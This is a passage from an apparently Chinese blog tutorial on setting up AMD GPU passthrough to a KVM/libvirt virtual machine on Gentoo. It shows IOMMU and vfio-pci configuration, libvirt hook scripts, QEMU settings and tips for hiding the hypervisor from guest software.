可视情况添加（修复或导致黑屏）：iommu=pt</span><br>GRUB_CMDLINE_LINUX_DEFAULT=<span class=\"hljs-string\">&quot;amd_iommu=on iommu=pt&quot;</span><br><br></code></pre></td></tr></table></figure>\n\n<p>重启后,看看启动日志检查一下IOMMU是否已启用,使用超级用户权限运行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">worisur ~ <span class=\"hljs-comment\"># dmesg | grep -e DMAR -e iommu</span><br>[    0.000000] Command line: BOOT_IMAGE=/vmlinuz-5.15.52-gentoo-dist root=UUID=c9ffa84e-ef8f-45f0-b508-18d12102fbbc ro amd_iommu=on iommu=pt<br>[    0.067146] Kernel <span class=\"hljs-built_in\">command</span> line: BOOT_IMAGE=/vmlinuz-5.15.52-gentoo-dist root=UUID=c9ffa84e-ef8f-45f0-b508-18d12102fbbc ro amd_iommu=on iommu=pt<br>[    0.531545] iommu: Default domain <span class=\"hljs-built_in\">type</span>: Passthrough (<span class=\"hljs-built_in\">set</span> via kernel <span class=\"hljs-built_in\">command</span> line)<br>[    0.547978] pci 0000:00:01.0: Adding to iommu group 0<br>[    0.547984] pci 0000:00:01.1: Adding to iommu group 1<br>[    0.547991] pci 0000:00:01.2: Adding to iommu group 2<br>[    0.547997] pci 0000:00:02.0: Adding to iommu group 3<br>[    0.548004] pci 0000:00:03.0: Adding to iommu group 4<br>[    0.548010] pci 0000:00:03.1: Adding to iommu group 5<br>[    0.548016] pci 0000:00:04.0: Adding to iommu group 6<br>[    0.548022] pci 0000:00:05.0: Adding to iommu group 7<br>[    0.548029] pci 0000:00:07.0: Adding to iommu group 8<br>[    0.548034] pci 0000:00:07.1: Adding to iommu group 9<br>[    0.548040] pci 0000:00:08.0: Adding to iommu group 10<br>[    0.548046] pci 0000:00:08.1: Adding to iommu group 11<br>[    0.548054] pci 0000:00:14.0: Adding to iommu group 12<br>[    0.548059] pci 0000:00:14.3: Adding to iommu group 12<br>[    0.548075] pci 0000:00:18.0: Adding to iommu group 13<br>[    0.548079] pci 0000:00:18.1: Adding to iommu group 13<br>[    0.548084] pci 0000:00:18.2: Adding to iommu group 13<br>[    0.548089] pci 0000:00:18.3: Adding to iommu group 13<br>[    0.548093] pci 0000:00:18.4: Adding to iommu group 13<br>[    0.548098] pci 0000:00:18.5: Adding to iommu group 13<br>[    0.548102] pci 0000:00:18.6: Adding to iommu group 13<br>[    0.548107] pci 0000:00:18.7: Adding to iommu group 13<br>[    0.548112] pci 0000:01:00.0: Adding to iommu group 14<br>[    0.548122] pci 0000:02:00.0: Adding to iommu group 15<br>[    0.548128] pci 0000:02:00.1: Adding to iommu group 15<br>[    0.548133] pci 0000:02:00.2: Adding to iommu group 15<br>[    0.548136] pci 0000:03:00.0: Adding to iommu group 15<br>[    0.548139] pci 0000:03:04.0: Adding to iommu group 15<br>[    0.548142] pci 0000:03:08.0: Adding to iommu group 15<br>[    0.548144] pci 0000:03:09.0: Adding to iommu group 15<br>[    0.548147] pci 0000:05:00.0: Adding to iommu group 15<br>[    0.548150] pci 0000:06:00.0: Adding to iommu group 15<br>[    0.548153] pci 0000:07:00.0: Adding to iommu group 15<br>[    0.548159] pci 0000:08:00.0: Adding to iommu group 16<br>[    0.548165] pci 0000:09:00.0: Adding to iommu group 17<br>[    0.548289] pci 0000:0a:00.0: Adding to iommu group 18<br>[    0.548297] pci 0000:0a:00.1: Adding to iommu group 19<br>[    0.548306] pci 0000:0a:00.2: Adding to iommu group 20<br>[    0.548314] pci 0000:0a:00.3: Adding to iommu group 21<br>[    0.548320] pci 0000:0b:00.0: Adding to iommu group 22<br>[    0.548326] pci 0000:0c:00.0: Adding to iommu group 23<br>[    0.548332] pci 0000:0c:00.1: Adding to iommu group 24<br>[    0.548338] pci 0000:0c:00.3: Adding to iommu group 25<br>[    0.548344] pci 0000:0c:00.4: Adding to iommu group 26<br>[    0.549234] perf/amd_iommu: Detected AMD IOMMU <span class=\"hljs-comment\">#0 (2 banks, 4 counters/bank).</span><br></code></pre></td></tr></table></figure>\n\n<p>查看显卡相关信息：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">shopt</span> -s nullglob<br><span class=\"hljs-keyword\">for</span> g <span class=\"hljs-keyword\">in</span> `find /sys/kernel/iommu_groups/* -maxdepth 0 -<span class=\"hljs-built_in\">type</span> d | <span class=\"hljs-built_in\">sort</span> -V`; <span class=\"hljs-keyword\">do</span><br>    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;IOMMU Group <span class=\"hljs-variable\">$&#123;g##*/&#125;</span>:&quot;</span><br>    <span class=\"hljs-keyword\">for</span> d <span class=\"hljs-keyword\">in</span> <span class=\"hljs-variable\">$g</span>/devices/*; <span class=\"hljs-keyword\">do</span><br>        <span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">&quot;\\t<span class=\"hljs-subst\">$(lspci -nns $&#123;d##*/&#125;)</span>&quot;</span><br>    <span class=\"hljs-keyword\">done</span>;<br><span class=\"hljs-keyword\">done</span>;<br><br><span class=\"hljs-comment\"># 结果</span><br><br>IOMMU Group 16:<br>        08:00.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 10 XL Upstream Port of PCI Express Switch [1002:1478] (rev c1)<br>IOMMU Group 17:<br>        09:00.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 10 XL Downstream Port of PCI Express Switch [1002:1479]<br>IOMMU Group 18:<br>        0a:00.0 VGA compatible controller [0300]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 21 [Radeon RX 6800/6800 XT / 6900 XT] [1002:73bf] (rev c1)<br>IOMMU Group 19:<br>        0a:00.1 Audio device [0403]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 21/23 HDMI/DP Audio Controller [1002:ab28]<br>IOMMU Group 20:<br>        0a:00.2 USB controller [0c03]: Advanced Micro Devices, Inc. [AMD/ATI] Device [1002:73a6]<br>IOMMU Group 21:<br>        0a:00.3 Serial bus controller [0c80]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 21 USB [1002:73a4]<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-3-内核模块添加\"><a href=\"#2-3-内核模块添加\" class=\"headerlink\" title=\"2.3 内核模块添加\"></a>2.3 内核模块添加</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 配置ids内容</span><br>worisur ~ <span class=\"hljs-comment\"># cat /etc/modprobe.d/vfio.conf</span><br>options vfio-pci ids=1002:73bf,1002:ab28,1002:73a6,1002:73a4,1002:1478,1002:1479<br>options vfio-pci disable_idle_d3=1<br>options vfio-pci disable_vga=1<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-4-hook-脚本\"><a href=\"#2-4-hook-脚本\" class=\"headerlink\" title=\"2.4 hook 脚本\"></a>2.4 hook 脚本</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">worisur /etc/libvirt/hooks <span class=\"hljs-comment\"># cat qemu</span><br><span class=\"hljs-comment\">#!/bin/bash</span><br>OBJECT=<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$1</span>&quot;</span><br>OPERATION=<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$2</span>&quot;</span><br><br><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-variable\">$OBJECT</span> == <span class=\"hljs-string\">&quot;miloo&quot;</span> ] || [ <span class=\"hljs-variable\">$OBJECT</span> == <span class=\"hljs-string\">&quot;mod&quot;</span> ] || [ <span class=\"hljs-variable\">$OBJECT</span> == <span class=\"hljs-string\">&quot;work&quot;</span> ]; <span class=\"hljs-keyword\">then</span><br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$OPERATION</span>&quot;</span> <span class=\"hljs-keyword\">in</span><br>                <span class=\"hljs-string\">&quot;prepare&quot;</span>)<br>                systemctl start libvirt-nosleep@<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$OBJECT</span>&quot;</span>  2&gt;&amp;1 | <span class=\"hljs-built_in\">tee</span> -a /var/log/libvirt/custom_hooks.log<br>                /bin/vfio-startup.sh 2&gt;&amp;1 | <span class=\"hljs-built_in\">tee</span> -a /var/log/libvirt/custom_hooks.log<br>                ;;<br><br>            <span class=\"hljs-string\">&quot;release&quot;</span>)<br>                systemctl stop libvirt-nosleep@<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$OBJECT</span>&quot;</span>  2&gt;&amp;1 | <span class=\"hljs-built_in\">tee</span> -a /var/log/libvirt/custom_hooks.log<br>                /bin/vfio-teardown.sh 2&gt;&amp;1 | <span class=\"hljs-built_in\">tee</span> -a /var/log/libvirt/custom_hooks.log<br>                ;;<br>        <span class=\"hljs-keyword\">esac</span><br><span class=\"hljs-keyword\">fi</span><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">worisur /etc/libvirt/hooks <span class=\"hljs-comment\"># cat vfio-startup.sh</span><br><span class=\"hljs-comment\">#!/bin/bash</span><br><span class=\"hljs-comment\"># Helpful to read output when debugging</span><br><span class=\"hljs-built_in\">set</span> -x<br><br>long_delay=10<br>medium_delay=5<br>short_delay=1<br><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;Beginning of startup!&quot;</span><br><br><span class=\"hljs-keyword\">function</span> stop_display_manager_if_running &#123;<br>    <span class=\"hljs-comment\"># Stop dm using systemd</span><br>    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">command</span> -v systemctl; <span class=\"hljs-keyword\">then</span><br>        <span class=\"hljs-keyword\">if</span> systemctl is-active --quiet <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$1</span>.service&quot;</span> ; <span class=\"hljs-keyword\">then</span><br>            <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$1</span> &gt;&gt; /tmp/vfio-store-display-manager<br>            systemctl stop <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$1</span>.service&quot;</span><br>        <span class=\"hljs-keyword\">fi</span><br><br>        <span class=\"hljs-keyword\">while</span> systemctl is-active --quiet <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$1</span>.service&quot;</span> ; <span class=\"hljs-keyword\">do</span><br>            <span class=\"hljs-built_in\">sleep</span> <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$&#123;medium_delay&#125;</span>&quot;</span><br>        <span class=\"hljs-keyword\">done</span><br><br>        <span class=\"hljs-built_in\">return</span><br>    <span class=\"hljs-keyword\">fi</span><br><br>    <span class=\"hljs-comment\"># Stop dm using runit</span><br>    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">command</span> -v sv; <span class=\"hljs-keyword\">then</span><br>        <span class=\"hljs-keyword\">if</span> sv status <span class=\"hljs-variable\">$1</span> ; <span class=\"hljs-keyword\">then</span><br>            <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$1</span> &gt;&gt; /tmp/vfio-store-display-manager<br>            sv stop <span class=\"hljs-variable\">$1</span><br>        <span class=\"hljs-keyword\">fi</span><br>    <span class=\"hljs-keyword\">fi</span><br>&#125;<br><br><span class=\"hljs-comment\"># Stop currently running display manager</span><br><span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">test</span> -e <span class=\"hljs-string\">&quot;/tmp/vfio-store-display-manager&quot;</span> ; <span class=\"hljs-keyword\">then</span><br>    <span class=\"hljs-built_in\">rm</span> -f /tmp/vfio-store-display-manager<br><span class=\"hljs-keyword\">fi</span><br><br>stop_display_manager_if_running gdm<br>stop_display_manager_if_running display-manager<br><br><span class=\"hljs-built_in\">sleep</span> <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$&#123;medium_delay&#125;</span>&quot;</span><br><br><span class=\"hljs-comment\"># Unbind VTconsoles if currently bound (adapted from https://www.kernel.org/doc/Documentation/fb/fbcon.txt)</span><br><span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">test</span> -e <span class=\"hljs-string\">&quot;/tmp/vfio-bound-consoles&quot;</span> ; <span class=\"hljs-keyword\">then</span><br>    <span class=\"hljs-built_in\">rm</span> -f /tmp/vfio-bound-consoles<br><span class=\"hljs-keyword\">fi</span><br><span class=\"hljs-keyword\">for</span> (( i = 0; i &lt; 16; i++))<br><span class=\"hljs-keyword\">do</span><br>  <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">test</span> -x /sys/class/vtconsole/vtcon<span class=\"hljs-variable\">$&#123;i&#125;</span>; <span class=\"hljs-keyword\">then</span><br>      <span class=\"hljs-keyword\">if</span> [ `<span class=\"hljs-built_in\">cat</span> /sys/class/vtconsole/vtcon<span class=\"hljs-variable\">$&#123;i&#125;</span>/name | grep -c <span class=\"hljs-string\">&quot;frame buffer&quot;</span>` \\<br>           = 1 ]; <span class=\"hljs-keyword\">then</span><br>               <span class=\"hljs-built_in\">echo</span> 0 &gt; /sys/class/vtconsole/vtcon<span class=\"hljs-variable\">$&#123;i&#125;</span>/bind<br>           <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;Unbinding console <span class=\"hljs-variable\">$&#123;i&#125;</span>&quot;</span><br>           <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$i</span> &gt;&gt; /tmp/vfio-bound-consoles<br>      <span class=\"hljs-keyword\">fi</span><br>  <span class=\"hljs-keyword\">fi</span><br><span class=\"hljs-keyword\">done</span><br><br><span class=\"hljs-comment\"># Unbind EFI-Framebuffer</span><br><span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">test</span> -e <span class=\"hljs-string\">&quot;/tmp/vfio-is-nvidia&quot;</span> ; <span class=\"hljs-keyword\">then</span><br>    <span class=\"hljs-built_in\">rm</span> -f /tmp/vfio-is-nvidia<br><span class=\"hljs-keyword\">fi</span><br><br><span class=\"hljs-keyword\">if</span> lsmod | grep <span class=\"hljs-string\">&quot;nvidia&quot;</span> &amp;&gt; /dev/null ; <span class=\"hljs-keyword\">then</span><br>    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;true&quot;</span> &gt;&gt; /tmp/vfio-is-nvidia<br>    <span class=\"hljs-built_in\">echo</span> efi-framebuffer.0 &gt; /sys/bus/platform/drivers/efi-framebuffer/unbind<br><span class=\"hljs-keyword\">fi</span><br><br><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;End of startup!&quot;</span><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">worisur /etc/libvirt/hooks <span class=\"hljs-comment\"># cat vfio-teardown.sh</span><br><span class=\"hljs-comment\">#!/bin/bash</span><br><span class=\"hljs-built_in\">set</span> -x<br><br><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;Beginning of teardown!&quot;</span><br><br><span class=\"hljs-built_in\">sleep</span> 10<br><br><span class=\"hljs-comment\"># Restart Display Manager</span><br>input=<span class=\"hljs-string\">&quot;/tmp/vfio-store-display-manager&quot;</span><br><span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> displayManager; <span class=\"hljs-keyword\">do</span><br>  <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">command</span> -v systemctl; <span class=\"hljs-keyword\">then</span><br>    systemctl start <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$displayManager</span>.service&quot;</span><br>  <span class=\"hljs-keyword\">else</span><br>    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">command</span> -v sv; <span class=\"hljs-keyword\">then</span><br>      sv start <span class=\"hljs-variable\">$displayManager</span><br>    <span class=\"hljs-keyword\">fi</span><br>  <span class=\"hljs-keyword\">fi</span><br><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$input</span>&quot;</span><br><br><span class=\"hljs-comment\"># Rebind VT consoles (adapted from https://www.kernel.org/doc/Documentation/fb/fbcon.txt)</span><br>input=<span class=\"hljs-string\">&quot;/tmp/vfio-bound-consoles&quot;</span><br><span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> consoleNumber; <span class=\"hljs-keyword\">do</span><br>  <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">test</span> -x /sys/class/vtconsole/vtcon<span class=\"hljs-variable\">$&#123;consoleNumber&#125;</span>; <span class=\"hljs-keyword\">then</span><br>      <span class=\"hljs-keyword\">if</span> [ `<span class=\"hljs-built_in\">cat</span> /sys/class/vtconsole/vtcon<span class=\"hljs-variable\">$&#123;consoleNumber&#125;</span>/name | grep -c <span class=\"hljs-string\">&quot;frame buffer&quot;</span>` \\<br>           = 1 ]; <span class=\"hljs-keyword\">then</span><br>    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;Rebinding console <span class=\"hljs-variable\">$&#123;consoleNumber&#125;</span>&quot;</span><br>          <span class=\"hljs-built_in\">echo</span> 1 &gt; /sys/class/vtconsole/vtcon<span class=\"hljs-variable\">$&#123;consoleNumber&#125;</span>/bind<br>      <span class=\"hljs-keyword\">fi</span><br>  <span class=\"hljs-keyword\">fi</span><br><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$input</span>&quot;</span><br><br><span class=\"hljs-comment\"># Rebind framebuffer for nvidia</span><br><span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">test</span> -e <span class=\"hljs-string\">&quot;/tmp/vfio-is-nvidia&quot;</span> ; <span class=\"hljs-keyword\">then</span><br>  <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;efi-framebuffer.0&quot;</span> &gt; /sys/bus/platform/drivers/efi-framebuffer/bind<br><span class=\"hljs-keyword\">fi</span><br><br><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;End of teardown!&quot;</span><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 权限为 kvm 用户 组为 libvirt</span><br>worisur /etc/libvirt/hooks <span class=\"hljs-comment\"># ls -al</span><br>总用量 20<br>drwxr-xr-x 2 miloo libvirt 4096  7月 14 23:35 .<br>drwxr-xr-x 7 root  root    4096  7月 13 01:25 ..<br>-rwxr-xr-x 1 miloo libvirt  622  7月 14 23:32 qemu<br>-rwxr-xr-x 1 miloo libvirt 1981  7月 13 02:06 vfio-startup.sh<br>-rwxr-xr-x 1 miloo libvirt  972  7月 13 02:07 vfio-teardown.sh<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-5-QEMU-配置\"><a href=\"#2-5-QEMU-配置\" class=\"headerlink\" title=\"2.5 QEMU 配置\"></a>2.5 QEMU 配置</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># /etc/libvirt/libvirtd.conf 修改如下行：</span><br>worisur /etc/libvirt <span class=\"hljs-comment\"># cat libvirtd.conf</span><br>unix_sock_group = <span class=\"hljs-string\">&quot;libvirt&quot;</span><br>unix_sock_rw_perms = <span class=\"hljs-string\">&quot;0770&quot;</span><br>log_filters=<span class=\"hljs-string\">&quot;1:qemu&quot;</span><br>log_outputs=<span class=\"hljs-string\">&quot;1:file:/var/log/libvirt/libvirtd.log&quot;</span><br><br><span class=\"hljs-comment\"># # /etc/libvirt/qemu.conf 修改如下行：</span><br>worisur /etc/libvirt <span class=\"hljs-comment\"># cat qemu.conf</span><br>user = <span class=\"hljs-string\">&quot;miloo&quot;</span><br>group = <span class=\"hljs-string\">&quot;libvirt&quot;</span><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"3-直通\"><a href=\"#3-直通\" class=\"headerlink\" title=\"3 直通\"></a>3 直通</h1><h2 id=\"3-1-创建不直通的虚拟机\"><a href=\"#3-1-创建不直通的虚拟机\" class=\"headerlink\" title=\"3.1 创建不直通的虚拟机\"></a>3.1 创建不直通的虚拟机</h2><ul>\n<li>下载<a href=\"https://github.com/virtio-win/virtio-win-pkg-scripts/blob/master/README.md\">驱动</a></li>\n<li>芯片组：Q35</li>\n<li>固件：ovmf_code.fd</li>\n</ul>\n<h2 id=\"3-2-vbios\"><a href=\"#3-2-vbios\" class=\"headerlink\" title=\"3.2 vbios\"></a>3.2 vbios</h2><p><a href=\"http://www.xiaobaixitong.com/help/43692.html\">gpuz提取</a></p>\n<p><a href=\"https://www.techpowerup.com/vgabios/?architecture=&manufacturer=&model=RX+6800+XT&interface=&memType=&memSize=&since=\">此处下载</a></p>\n<h2 id=\"3-3-添加直通设备\"><a href=\"#3-3-添加直通设备\" class=\"headerlink\" title=\"3.3 添加直通设备\"></a>3.3 添加直通设备</h2><ol>\n<li>打开虚拟机管理器,把显卡的所有pci部分都添加到虚拟机里面。<blockquote>\n<p>pci设备：1002:73bf,1002:ab28,1002:73a6,1002:73a4,1002:1478,1002:1479</p>\n</blockquote>\n</li>\n<li>启用XML编辑, 在显卡的所有pci设备里面, 在</source>之后添加: <code>&lt;rom bar=&quot;on&quot; file=&quot;vbios路径&quot;/&gt;</code></li>\n<li>把串口,显示协议,信道,usb转接,显卡qxl,触摸板那些东西删掉</li>\n<li>添加你的USB设备,比如鼠标、键盘和USB耳机。</li>\n</ol>\n<h1 id=\"4-问题解决\"><a href=\"#4-问题解决\" class=\"headerlink\" title=\"4 问题解决\"></a>4 问题解决</h1><h2 id=\"4-1-软件不能运行在虚拟机上-Sorry-this-program-cannot-run-under-a-virtual-machine\"><a href=\"#4-1-软件不能运行在虚拟机上-Sorry-this-program-cannot-run-under-a-virtual-machine\" class=\"headerlink\" title=\"4.1 软件不能运行在虚拟机上(Sorry, this program cannot run under a virtual machine)\"></a>4.1 软件不能运行在虚拟机上(Sorry, this program cannot run under a virtual machine)</h2><ul>\n<li>Pass the SMBIOS information to the guest</li>\n<li>Pass the exact host’s CPU model to the guest</li>\n<li>Hide the “hypervisor” feature from the CPU</li>\n<li>In the “features &gt; hyperv” section, add a vendor_id</li>\n<li>In the “features” section, hide kvm.</li>\n</ul>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">os</span>&gt;</span><br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">smbios</span> <span class=\"hljs-attr\">mode</span>=<span 